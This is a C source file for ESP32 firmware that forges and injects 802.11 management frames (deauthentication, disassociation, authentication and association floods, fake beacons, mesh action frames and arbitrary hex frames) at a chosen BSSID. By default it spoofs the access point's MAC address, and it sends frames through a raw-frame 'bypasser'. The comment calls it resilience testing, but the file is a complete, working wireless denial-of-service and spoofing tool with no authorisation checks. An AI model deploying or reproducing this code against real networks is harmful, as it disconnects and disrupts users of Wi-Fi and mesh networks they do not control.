/**
 * mesh_packet_inject.c
 *
 * Injects forged 802.11 management frames at mesh parents/children.
 * Used to test mesh resilience (deauth child nodes, auth/assoc floods, etc.).
 */

#include "mesh_packet_inject.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>

#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "MESH_INJECT";

static const char *template_strings[] = {
    [MESH_INJECT_TEMPLATE_DEAUTH]      = "Deauth",
    [MESH_INJECT_TEMPLATE_DISASSOC]    = "Disassociation",
    [MESH_INJECT_TEMPLATE_AUTH]        = "Authentication",
    [MESH_INJECT_TEMPLATE_ASSOC_REQ]   = "Assoc Request",
    [MESH_INJECT_TEMPLATE_PROBE_REQ]   = "Probe Request",
    [MESH_INJECT_TEMPLATE_BEACON]      = "Beacon",
    [MESH_INJECT_TEMPLATE_MESH_ACTION] = "Mesh Action",
    [MESH_INJECT_TEMPLATE_CUSTOM_HEX]  = "Custom Hex",
};

static mesh_inject_state_t  s_state;
static mesh_inject_config_t s_cfg;
static volatile bool        s_running = false;
static TaskHandle_t         s_task    = NULL;
static esp_timer_handle_t   s_timeout_timer = NULL;
static SemaphoreHandle_t    s_mutex = NULL;
static bool                 s_ap_was_stopped = false;

static bool mutex_take(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
        if (s_mutex == NULL) return false;
    }
    return xSemaphoreTake(s_mutex, pdMS_TO_TICKS(2000)) == pdTRUE;
}

static void mutex_give(void)
{
    if (s_mutex != NULL) {
        xSemaphoreGive(s_mutex);
    }
}

const char *mesh_packet_inject_template_str(mesh_inject_template_t t)
{
    if (t >= MESH_INJECT_TEMPLATE_COUNT) return "Unknown";
    return template_strings[t];
}

static void frame_to_hex(const uint8_t *data, uint16_t len, char *out, size_t out_sz)
{
    if (!data || !out || out_sz < 3) {
        if (out && out_sz) out[0] = '\0';
        return;
    }
    size_t max_bytes = (out_sz - 1) / 2;
    if (len > max_bytes) len = (uint16_t)max_bytes;
    for (uint16_t i = 0; i < len; i++) {
        snprintf(out + i * 2, 3, "%02x", data[i]);
    }
    out[len * 2] = '\0';
}

static int parse_hex_string(const char *hex, uint8_t *out, size_t max_len)
{
    if (!hex || !out || max_len == 0) return -1;

    size_t out_len = 0;
    uint8_t nibble = 0;
    bool have_hi = false;

    for (const char *p = hex; *p; p++) {
        if (isspace((unsigned char)*p)) continue;
        int v;
        if (*p >= '0' && *p <= '9') v = *p - '0';
        else if (*p >= 'a' && *p <= 'f') v = *p - 'a' + 10;
        else if (*p >= 'A' && *p <= 'F') v = *p - 'A' + 10;
        else return -1;

        if (!have_hi) {
            nibble = (uint8_t)(v << 4);
            have_hi = true;
        } else {
            if (out_len >= max_len) return -1;
            out[out_len++] = (uint8_t)(nibble | (uint8_t)v);
            have_hi = false;
        }
    }

    if (have_hi) return -1;
    return (int)out_len;
}

static void append_log(uint8_t template_id, uint8_t channel,
                       const uint8_t *frame, uint16_t len, bool ok)
{
    if (s_state.log_count >= MESH_INJECT_MAX_LOG) return;

    mesh_inject_log_t *e = &s_state.log[s_state.log_count++];
    e->time_ms      = (uint32_t)(esp_timer_get_time() / 1000);
    e->template_id  = template_id;
    e->channel      = channel;
    e->frame_len    = len;
    e->tx_ok        = ok;
    frame_to_hex(frame, len, e->frame_hex, sizeof(e->frame_hex));
}

static uint16_t build_deauth(uint8_t *out, size_t max_len,
                             const uint8_t *dest, const uint8_t *src,
                             const uint8_t *bssid, uint16_t reason)
{
    if (max_len < 26) return 0;
    memset(out, 0, 26);
    out[0] = 0xC0;
    out[1] = 0x00;
    out[2] = 0x3a;
    out[3] = 0x01;
    memcpy(out + 4,  dest,  6);
    memcpy(out + 10, src,   6);
    memcpy(out + 16, bssid, 6);
    out[24] = (uint8_t)(reason & 0xFF);
    out[25] = (uint8_t)((reason >> 8) & 0xFF);
    return 26;
}

static uint16_t build_disassoc(uint8_t *out, size_t max_len,
                               const uint8_t *dest, const uint8_t *src,
                               const uint8_t *bssid, uint16_t reason)
{
    if (max_len < 26) return 0;
    memset(out, 0, 26);
    out[0] = 0xA0;
    out[1] = 0x00;
    out[2] = 0x3a;
    out[3] = 0x01;
    memcpy(out + 4,  dest,  6);
    memcpy(out + 10, src,   6);
    memcpy(out + 16, bssid, 6);
    out[24] = (uint8_t)(reason & 0xFF);
    out[25] = (uint8_t)((reason >> 8) & 0xFF);
    return 26;
}

static uint16_t build_auth(uint8_t *out, size_t max_len,
                           const uint8_t *dest, const uint8_t *src,
                           const uint8_t *bssid)
{
    if (max_len < 30) return 0;
    memset(out, 0, 30);
    out[0] = 0xB0;
    out[1] = 0x00;
    memcpy(out + 4,  dest,  6);
    memcpy(out + 10, src,   6);
    memcpy(out + 16, bssid, 6);
    out[24] = 0x00; out[25] = 0x00; /* open system */
    out[26] = 0x01; out[27] = 0x00; /* seq 1 */
    out[28] = 0x00; out[29] = 0x00; /* status 0 */
    return 30;
}

static uint16_t build_assoc_req(uint8_t *out, size_t max_len,
                                const uint8_t *dest, const uint8_t *src,
                                const uint8_t *bssid, const char *ssid)
{
    uint8_t ssid_len = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
    uint16_t total = (uint16_t)(28 + ssid_len);
    if (max_len < total) return 0;

    memset(out, 0, total);
    out[0] = 0x00;
    out[1] = 0x00;
    memcpy(out + 4,  dest,  6);
    memcpy(out + 10, src,   6);
    memcpy(out + 16, bssid, 6);
    out[24] = 0x31; out[25] = 0x00; /* capability */
    out[26] = 0x0a; out[27] = 0x00; /* listen interval */
    out[28] = 0x00;                 /* SSID tag */
    out[29] = ssid_len;
    if (ssid_len > 0) {
        memcpy(out + 30, ssid, ssid_len);
    }
    return total;
}

static uint16_t build_probe_req(uint8_t *out, size_t max_len,
                                const uint8_t *src, const char *ssid)
{
    uint8_t ssid_len = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
    uint16_t total = (uint16_t)(24 + 2 + ssid_len);
    if (max_len < total) return 0;

    memset(out, 0, total);
    out[0] = 0x40;
    out[1] = 0x00;
    memset(out + 4, 0xFF, 6);
    memcpy(out + 10, src, 6);
    memcpy(out + 16, src, 6);
    out[24] = 0x00;
    out[25] = ssid_len;
    if (ssid_len > 0) {
        memcpy(out + 26, ssid, ssid_len);
    }
    return total;
}

static uint16_t build_beacon(uint8_t *out, size_t max_len,
                             const uint8_t *bssid, const char *ssid, uint8_t channel)
{
    uint8_t ssid_len = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
    uint16_t total = (uint16_t)(38 + ssid_len + 3);
    if (max_len < total) return 0;

    memset(out, 0, total);
    out[0] = 0x80;
    out[1] = 0x00;
    memset(out + 4, 0xFF, 6);
    memcpy(out + 10, bssid, 6);
    memcpy(out + 16, bssid, 6);
    out[24] = 0x64; out[25] = 0x00;
    out[26] = 0x01; out[27] = 0x04;
    out[28] = 0x00;
    out[29] = ssid_len;
    if (ssid_len > 0) {
        memcpy(out + 30, ssid, ssid_len);
    }
    uint16_t off = (uint16_t)(30 + ssid_len);
    out[off++] = 0x03;
    out[off++] = 0x01;
    out[off++] = channel;
    return off;
}

static uint16_t build_mesh_action(uint8_t *out, size_t max_len,
                                  const uint8_t *dest, const uint8_t *src,
                                  const uint8_t *bssid)
{
    if (max_len < 32) return 0;
    memset(out, 0, 32);
    out[0] = 0xD0;
    out[1] = 0x00;
    memcpy(out + 4,  dest,  6);
    memcpy(out + 10, src,   6);
    memcpy(out + 16, bssid, 6);
    out[24] = 0x00; out[25] = 0x00;
    out[26] = 127; /* vendor specific */
    out[27] = 0x00;
    out[28] = 0xE0; out[29] = 0x9A; out[30] = 0xF6; /* Espressif OUI */
    out[31] = 0x01;
    return 32;
}

static int build_frame(uint8_t *out, size_t max_len, const mesh_inject_config_t *cfg)
{
    const uint8_t *src = cfg->src_mac_set ? cfg->src_mac : cfg->target_bssid;

    switch (cfg->template_id) {
        case MESH_INJECT_TEMPLATE_DEAUTH:
            return build_deauth(out, max_len, cfg->dest_mac, src,
                                cfg->target_bssid, cfg->reason_code);
        case MESH_INJECT_TEMPLATE_DISASSOC:
            return build_disassoc(out, max_len, cfg->dest_mac, src,
                                  cfg->target_bssid, cfg->reason_code);
        case MESH_INJECT_TEMPLATE_AUTH:
            return build_auth(out, max_len, cfg->dest_mac, src, cfg->target_bssid);
        case MESH_INJECT_TEMPLATE_ASSOC_REQ:
            return build_assoc_req(out, max_len, cfg->dest_mac, src,
                                   cfg->target_bssid, cfg->ssid);
        case MESH_INJECT_TEMPLATE_PROBE_REQ:
            return build_probe_req(out, max_len, src, cfg->ssid);
        case MESH_INJECT_TEMPLATE_BEACON:
            return build_beacon(out, max_len, cfg->target_bssid, cfg->ssid, cfg->channel);
        case MESH_INJECT_TEMPLATE_MESH_ACTION:
            return build_mesh_action(out, max_len, cfg->dest_mac, src, cfg->target_bssid);
        case MESH_INJECT_TEMPLATE_CUSTOM_HEX:
            return parse_hex_string(cfg->custom_hex, out, max_len);
        default:
            return -1;
    }
}

static bool send_frame(const uint8_t *frame, uint16_t len)
{
    return wsl_bypasser_send_raw_frame(frame, len);
}

static uint8_t resolve_tx_channel(uint8_t requested)
{
    if (requested > 0) {
        return requested;
    }
#ifndef CONFIG_MGMT_AP_CHANNEL
#define CONFIG_MGMT_AP_CHANNEL 6
#endif
    return CONFIG_MGMT_AP_CHANNEL;
}

static bool prepare_radio(uint8_t channel)
{
  esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

    s_ap_was_stopped = false;
    wifi_mode_t mode = WIFI_MODE_NULL;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_APSTA) {
        wifictl_mgmt_ap_stop();
        s_ap_was_stopped = true;
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    esp_err_t ch_err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (ch_err != ESP_OK) {
        ESP_LOGW(TAG, "Channel set to %u failed: %s (continuing on current channel)",
                 channel, esp_err_to_name(ch_err));
    }
    return true;
}

static void restore_radio(void)
{
    if (s_ap_was_stopped) {
        wifictl_mgmt_ap_start();
        s_ap_was_stopped = false;
    }
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
}

static void timeout_cb(void *arg)
{
    (void)arg;
    ESP_LOGW(TAG, "Packet injection timeout (%d s)", MESH_INJECT_TIMEOUT_SEC);
    if (mutex_take()) {
        s_state.timeout = true;
        mutex_give();
    }
    mesh_packet_inject_stop();
}

static void start_timeout_timer(void)
{
    if (s_timeout_timer != NULL) {
        esp_timer_stop(s_timeout_timer);
        esp_timer_delete(s_timeout_timer);
        s_timeout_timer = NULL;
    }
    const esp_timer_create_args_t args = {
        .callback = timeout_cb,
        .name     = "mesh_inject_to",
    };
    if (esp_timer_create(&args, &s_timeout_timer) == ESP_OK) {
        esp_timer_start_once(s_timeout_timer, MESH_INJECT_TIMEOUT_US);
    }
}

static void stop_timeout_timer(void)
{
    if (s_timeout_timer != NULL) {
        esp_timer_stop(s_timeout_timer);
        esp_timer_delete(s_timeout_timer);
        s_timeout_timer = NULL;
    }
}

static void inject_task(void *arg)
{
    (void)arg;

    ESP_LOGW(TAG, "═══ MESH PACKET INJECT START ═══");
    ESP_LOGI(TAG, "Template: %s, channel: %u, burst: %u, interval: %u ms",
             mesh_packet_inject_template_str(s_cfg.template_id),
             s_cfg.channel, s_cfg.burst_count, s_cfg.interval_ms);


    uint8_t tx_channel = resolve_tx_channel(s_cfg.channel);
    s_cfg.channel = tx_channel;
    s_state.channel = tx_channel;
    prepare_radio(tx_channel);

    uint32_t start_us = (uint32_t)esp_timer_get_time();
    uint8_t frame[MESH_INJECT_MAX_FRAME];

    for (uint16_t i = 0; i < s_cfg.burst_count && s_running; i++) {

        int flen = build_frame(frame, sizeof(frame), &s_cfg);
        if (flen <= 0) {
            snprintf(s_state.error, sizeof(s_state.error), "Frame build failed");
            ESP_LOGE(TAG, "Frame build failed (template=%d)", (int)s_cfg.template_id);
            break;
        }

        bool ok = send_frame(frame, (uint16_t)flen);
        if (ok) {
            s_state.packets_sent++;
        } else {
            s_state.packets_failed++;
        }
        append_log((uint8_t)s_cfg.template_id, s_cfg.channel, frame, (uint16_t)flen, ok);

        if (s_cfg.interval_ms > 0 && i + 1 < s_cfg.burst_count) {
            vTaskDelay(pdMS_TO_TICKS(s_cfg.interval_ms));
        }
        s_state.uptime_ms = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    }

    ESP_LOGI(TAG, "Injection done: sent=%lu failed=%lu",
             (unsigned long)s_state.packets_sent,
             (unsigned long)s_state.packets_failed);

    stop_timeout_timer();
    restore_radio();
    s_state.active = false;
    s_running = false;
    s_task = NULL;
    vTaskDelete(NULL);
}

void mesh_packet_inject_init(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
    }
    memset(&s_state, 0, sizeof(s_state));
    s_running = false;
    ESP_LOGI(TAG, "Mesh packet injection ready (%d templates)",
             (int)MESH_INJECT_TEMPLATE_COUNT);
}

esp_err_t mesh_packet_inject_start(const mesh_inject_config_t *cfg)
{
    if (!cfg) return ESP_ERR_INVALID_ARG;
    if (s_running) return ESP_ERR_INVALID_STATE;

    uint8_t zero[6] = {0};
    if (memcmp(cfg->target_bssid, zero, 6) == 0) {
        return ESP_ERR_INVALID_ARG;
    }
    if (cfg->template_id >= MESH_INJECT_TEMPLATE_COUNT) {
        return ESP_ERR_INVALID_ARG;
    }
    if (cfg->burst_count == 0) {
        return ESP_ERR_INVALID_ARG;
    }

    memset(&s_state, 0, sizeof(s_state));
    memcpy(&s_cfg, cfg, sizeof(s_cfg));

    if (!s_cfg.src_mac_set) {
        memcpy(s_cfg.src_mac, s_cfg.target_bssid, 6);
    }

    s_state.active = true;
    s_state.template_id = s_cfg.template_id;
    s_state.burst_count = s_cfg.burst_count;
    s_state.interval_ms = s_cfg.interval_ms;
    s_state.channel = s_cfg.channel;
    memcpy(s_state.target_bssid, s_cfg.target_bssid, 6);
    memcpy(s_state.dest_mac, s_cfg.dest_mac, 6);

    s_running = true;
    start_timeout_timer();

    if (xTaskCreate(inject_task, "mesh_inject", 6144, NULL, 2, &s_task) != pdPASS) {
        s_running = false;
        s_state.active = false;
        stop_timeout_timer();
        return ESP_ERR_NO_MEM;
    }

    return ESP_OK;
}

esp_err_t mesh_packet_inject_stop(void)
{
    if (!s_running && !s_state.active) {
        restore_radio();
        return ESP_OK;
    }

    s_running = false;
    stop_timeout_timer();

    int wait = 30;
    while (s_task && wait-- > 0) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (s_task) {
        vTaskDelete(s_task);
        s_task = NULL;
    }

    restore_radio();
    s_state.active = false;
    return ESP_OK;
}

bool mesh_packet_inject_is_active(void)
{
    return s_running || s_state.active;
}

const mesh_inject_state_t *mesh_packet_inject_get_state(void)
{
    return &s_state;
}

cJSON *mesh_packet_inject_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;

    const mesh_inject_state_t *st = &s_state;

    cJSON_AddBoolToObject(root, "active", st->active || s_running);
    cJSON_AddBoolToObject(root, "timeout", st->timeout);
    cJSON_AddNumberToObject(root, "packets_sent", st->packets_sent);
    cJSON_AddNumberToObject(root, "packets_failed", st->packets_failed);
    cJSON_AddNumberToObject(root, "uptime_ms", st->uptime_ms);
    cJSON_AddNumberToObject(root, "template", st->template_id);
    cJSON_AddStringToObject(root, "template_str",
    mesh_packet_inject_template_str(st->template_id));
    cJSON_AddNumberToObject(root, "channel", st->channel);
    cJSON_AddNumberToObject(root, "burst_count", st->burst_count);
    cJSON_AddNumberToObject(root, "interval_ms", st->interval_ms);
    cJSON_AddNumberToObject(root, "log_count", st->log_count);

    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             st->target_bssid[0], st->target_bssid[1], st->target_bssid[2],
             st->target_bssid[3], st->target_bssid[4], st->target_bssid[5]);
    cJSON_AddStringToObject(root, "bssid", mac);

    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             st->dest_mac[0], st->dest_mac[1], st->dest_mac[2],
             st->dest_mac[3], st->dest_mac[4], st->dest_mac[5]);
    cJSON_AddStringToObject(root, "dest_mac", mac);

    if (st->error[0]) {
        cJSON_AddStringToObject(root, "error", st->error);
    }

    cJSON_AddStringToObject(root, "status",
        (st->active || s_running) ? "Injecting" :
        (st->timeout ? "Timeout" : "Idle"));

    cJSON *logs = cJSON_CreateArray();
    for (int i = 0; i < st->log_count; i++) {
        const mesh_inject_log_t *e = &st->log[i];
        cJSON *item = cJSON_CreateObject();
        cJSON_AddNumberToObject(item, "time_ms", e->time_ms);
        cJSON_AddStringToObject(item, "template",
        mesh_packet_inject_template_str((mesh_inject_template_t)e->template_id));
        cJSON_AddNumberToObject(item, "channel", e->channel);
        cJSON_AddNumberToObject(item, "frame_len", e->frame_len);
        cJSON_AddBoolToObject(item, "tx_ok", e->tx_ok);
        cJSON_AddStringToObject(item, "frame_hex", e->frame_hex);
        cJSON_AddItemToArray(logs, item);
    }
    cJSON_AddItemToObject(root, "logs", logs);

    return root;
}
